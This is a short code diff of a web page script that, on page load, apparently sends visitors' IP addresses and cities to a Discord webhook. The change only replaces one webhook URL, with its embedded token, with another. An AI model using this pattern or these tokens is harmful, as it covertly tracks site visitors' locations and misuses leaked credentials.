@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", function () {
   const webhookURL =
-    "https://discord.com/api/webhooks/1240707397358452817/-Mh9X4Kw5oPVK8DS2EhVHnulO7oaZozdFOWxCVqXRKzI98Xb71RQo6GUJKDwvRv9Sgj9";
+    "https://discord.com/api/webhooks/1262915037543141388/6OH_1CsadYdJNdA0mKPGD-fw8MOf-V8UDShu3v_nUQGQK8a-6SVxkEWibZqBaTp9ZNCf";
 
   function sendToDiscord(ip, city) {
     const request = new XMLHttpRequest();
